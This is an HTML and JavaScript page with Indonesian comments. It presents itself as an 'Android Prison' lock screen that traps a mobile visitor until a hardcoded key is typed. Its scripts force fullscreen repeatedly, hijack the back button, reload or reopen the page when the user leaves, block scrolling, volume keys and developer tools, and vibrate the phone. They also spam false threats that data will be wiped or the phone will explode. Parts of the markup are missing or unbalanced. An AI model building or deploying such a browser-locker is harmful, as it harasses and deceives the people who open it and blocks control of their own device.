<!DOCTYPE html>
<html lang="en">
<head>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        
        body {
            background: radial-gradient(circle at 30% 30%, #ff0000, #0a0000);
            color: #00ffc3;
            font-family: 'Courier New', monospace;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            position: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            text-shadow: 0 0 15px cyan;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { background: radial-gradient(circle at 30% 30%, #ff0000, #0a0000); }
            50% { background: radial-gradient(circle at 70% 70%, #ff4444, #1a0000); }
            100% { background: radial-gradient(circle at 30% 30%, #ff0000, #0a0000); }
        }

        .prison-android {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 4px solid #ff4444;
            box-shadow: 0 0 80px #ff0000, inset 0 0 50px #ff0000;
            padding: 2rem 1.5rem;
            border-radius: 40px;
            text-align: center;
            width: 95%;
            max-width: 400px;
            animation: borderFlicker 0.5s infinite;
        }

        @keyframes borderFlicker {
            0% { border-color: #ff4444; box-shadow: 0 0 80px #ff0000; }
            25% { border-color: #00ffc3; box-shadow: 0 0 80px cyan; }
            50% { border-color: #ff4444; box-shadow: 0 0 80px #ff0000; }
            75% { border-color: #ffaa00; box-shadow: 0 0 80px orange; }
            100% { border-color: #ff4444; box-shadow: 0 0 80px #ff0000; }
        }

        h1 {
            font-size: 2.5rem;
            color: #ff4444;
            text-shadow: 0 0 30px red;
            margin-bottom: 10px;
            word-break: break-word;
        }

        .android-icon {
            font-size: 5rem;
            filter: drop-shadow(0 0 20px cyan);
            animation: shake 0.3s infinite;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }

        .warning-text {
            font-size: 1rem;
            color: #ffaa00;
            margin: 20px 0;
            background: #1a0000;
            padding: 15px;
            border-radius: 20px;
            border-left: 5px solid red;
        }

        input {
            background: #2a1a1a;
            border: 3px solid #ff4444;
            color: #00ffc3;
            font-family: 'Courier New', monospace;
            font-size: 1.8rem;
            padding: 15px 20px;
            width: 100%;
            border-radius: 50px;
            outline: none;
            text-align: center;
            letter-spacing: 5px;
            caret-color: #00ffc3;
            margin: 15px 0;
        }

        input:focus {
            border-color: #00ffc3;
            box-shadow: 0 0 40px cyan;
        }

        button {
            background: linear-gradient(45deg, #ff0000, #990000);
            color: white;
            border: none;
            font-size: 2rem;
            padding: 15px 30px;
            border-radius: 60px;
            font-weight: bold;
            width: 100%;
            margin: 10px 0;
            text-transform: uppercase;
            letter-spacing: 4px;
            box-shadow: 0 0 40px red;
            -webkit-tap-highlight-color: transparent;
        }

        button:active {
            transform: scale(0.95);
            background: linear-gradient(45deg, #990000, #ff0000);
        }

        .status-bar-fake {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 40px;
            background: black;
            color: #00ffc3;
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            font-size: 0.9rem;
            z-index: 9999;
            border-bottom: 2px solid red;
        }

        .overlay-touch {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: transparent;
            z-index: 10000;
            pointer-events: none;
        }

        @media (max-width: 400px) {
            h1 { font-size: 2rem; }
            .android-icon { font-size: 4rem; }
        }
    </style>
</head>
<body>

        <input type="password" id="keyInput" placeholder="KEY" autofocus>

        <div style="margin-top: 20px; color: #ff8888; font-size: 0.8rem;">
            Percobaan gagal: <span id="attemptCount">0</span>x

    <script>

        // /Locked Mode: EXTREME
        
        // ========== KONFIGURASI ==========
        const CORRECT_KEY = "2233"; // GANTI KEY DISINI
        const REDIRECT_URL = "https://www.google.com"; // Link setelah bebas
        // =================================

        let attempts = 0;
        let isVibrating = false;
        
        // ========== ANDROID TRAPS ==========
        
        // 1. CEK APAKAH INI ANDROID
        const isAndroid = /Android/i.test(navigator.userAgent);
        if (!isAndroid) {
            document.body.innerHTML = '<div style="color:white; padding:50px; text-align:center;">⚠️ Website ini khusus Android. Buka pake HP Android bos!</div>';
            throw new Error("Bukan Android");
        }

        // 2. FULLSCREEN PAKSA TERUS (KHUSUS ANDROID)
        function forceFullScreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            } else if (document.documentElement.msRequestFullscreen) {
                document.documentElement.msRequestFullscreen();
            }
        }
        
        // Paksa fullscreen tiap 1 detik
        forceFullScreen();
        setInterval(forceFullScreen, 1000);

        // 3. BLOCK BACK BUTTON ANDROID (History Manipulation)
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.pushState(null, null, location.href);
            // Kasih efek getar kalo pencet back
            vibratePhone(500);
            // Tambahin efek visual
            document.body.style.backgroundColor = '#ff0000';
            setTimeout(() => {
                document.body.style.backgroundColor = '';
            }, 200);
        };

        // 4. DETEKSI KELUAR DARI HALAMAN (HOME BUTTON, RECENT APPS)
        let isLeaving = false;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                // User pindah ke app lain atau pencet home
                isLeaving = true;
                
                // Kasih getar dahsyat
                vibratePhone([200, 100, 200, 100, 500]);
                
                // Paksa balik ke halaman ini dengan buka tab baru
                setTimeout(() => {
                    window.location.reload();

                // Buka popup yang gak bisa ditutup (khusus android)
                try {
                    window.open(window.location.href, '_blank', 'width=1,height=1,top=0,left=0');
                } catch(e) {}
                
                // Alert spam
                for(let i=0; i<3; i++) {
                    setTimeout(() => {
                        alert('🚫 TIDAK BISA KABUR!');
                    }, i * 200);
                }
            }
        });

        // 5. BLOCK VOLUME BUTTON (pake deteksi keydown)
        window.addEventListener('keydown', function(e) {
            // Volume up (175) dan volume down (174) di Android WebView
            if (e.keyCode === 175 || e.keyCode === 174 || e.key === 'VolumeUp' || e.key === 'VolumeDown') {
                e.preventDefault();
                e.stopPropagation();
                
                // Getar brutal
                vibratePhone([100, 50, 100, 50, 200, 50, 300]);
                
                // Munculin pesan
                const msgs = ['VOLUME? GAK ADA!', 'STOP PENCET!', 'MAU MATI?', 'SIAPA LU?'];
                const randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
                alert(randomMsg);
                
                return false;
            }
            
            // Block tombol back (keyCode 27 adalah ESC, di Android kadang jadi back)
            if (e.keyCode === 27 || e.key === 'Escape') {
                e.preventDefault();
                vibratePhone(300);
                return false;
            }
        });

        // 6. BLOCK SEMUA GESTURE (tap, scroll, dll)
        document.addEventListener('touchstart', function(e) {
            // Kalo lagi banyak percobaan, kasih getar random
            if (Math.random() > 0.7) {
                vibratePhone(50);
            }
        });

        document.addEventListener('touchmove', function(e) {
            e.preventDefault(); // Gak bisa scroll
        }, { passive: false });

        // 7. BLOCK KLIK KANAN (walau di android jarang)
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            vibratePhone(100);
        });

        // 8. AUTO REFRESH KALO LAMA GAK GERAK
        let inactivityTimer;
        function resetInactivity() {
            clearTimeout(inactivityTimer);
            inactivityTimer = setTimeout(() => {
                // Refresh setelah 30 detik gak ada aktivitas (biar makin susah kabur)
                window.location.reload();
            }, 30000);
        }
        
        document.addEventListener('touchstart', resetInactivity);
        document.addEventListener('keydown', resetInactivity);
        resetInactivity();

        // 9. VIBRASI (khusus android)
        function vibratePhone(pattern) {
            if (window.navigator && window.navigator.vibrate) {
                window.navigator.vibrate(pattern);
            }
        }

        // 10. CEK KEY
        document.getElementById('unlockBtn').addEventListener('click', function() {
            const userKey = document.getElementById('keyInput').value;
            
            if (userKey === CORRECT_KEY) {
                vibratePhone([100, 50, 100]); // Vibra sukses
                alert('✅ KEY BENAR! BEBAS...');
                window.location.href = REDIRECT_URL;
            } else {
                attempts++;
                document.getElementById('attemptCount').innerText = attempts;
                
                // Efek makin serem tiap salah
                vibratePhone([200, 100, 200, 300]);
                
                // Ganti warna background blink merah
                document.body.style.backgroundColor = '#8b0000';
                setTimeout(() => {
                    document.body.style.backgroundColor = '';
                }, 300);
                
                // Pesan random
                const errorMsgs = [
                    '❌ SALAH! MAU MATI?',
                    '❌ KEY LU SAMPAH!',
                    '❌ UDAH 3 KALI SALAH, DATA DIHAPUS!',
                    '❌ COBA LAGI KALO BERANI!',
                    '❌ ANDROID LU BAKAL MELEDAK!'
                ];
                alert(errorMsgs[attempts % errorMsgs.length]);
                
                // Reset input
                document.getElementById('keyInput').value = '';
                
                // Kalo salah 5 kali, reset total (refresh paksa)
                if (attempts >= 5) {
                    alert('💀 5x SALAH! RESET ANDROID...');
                    window.location.reload();
                }
            }
        });

        // Enter key di input
        document.getElementById('keyInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('unlockBtn').click();
            }
        });

        // 11. LOCK ORIENTASI (paksa portrait)
        function lockOrientation() {
            if (screen.orientation && screen.orientation.lock) {
                screen.orientation.lock('portrait').catch(function() {});
            }
        }
        lockOrientation();
        
        // Coba lock terus tiap 5 detik
        setInterval(lockOrientation, 5000);

        // 12. DETEKSI KALO USER INSTALL WEB APP (biar makin susah ilang)
        if (window.matchMedia('(display-mode: standalone)').matches) {
            // Kalo dibuka dari homescreen, tambahin terror extra
            document.querySelector('.warning-text').innerHTML += '<br>🔥 MODE STANDALONE DETEKSI 🔥';
        }

        // 13. BLOCK PRINTSCREEN (approximation)
        document.addEventListener('keyup', function(e) {
            if (e.key === 'PrintScreen') {
                alert('📸 GAK BISA SCREENSHOT!');
                vibratePhone(300);
            }
        });

        // 14. BLOCK DEVELOPER TOOLS (sederhana)
        setInterval(function() {
            if (window.outerHeight - window.innerHeight > 100 || window.outerWidth - window.innerWidth > 100) {
                // Developer tools terbuka, refresh paksa
                window.location.reload();
            }
        }, 1000);

        // 15. PERTAHANAN TERAKHIR: kalo semua gagal, paksa reload tiap 1 menit
        setInterval(function() {
            // Refresh biar makin susah kabur
            window.location.reload();
        }, 60000); // Refresh tiap 1 menit

        console.log('ZmZ Android Prison Active. Selamat berjuang korban!');
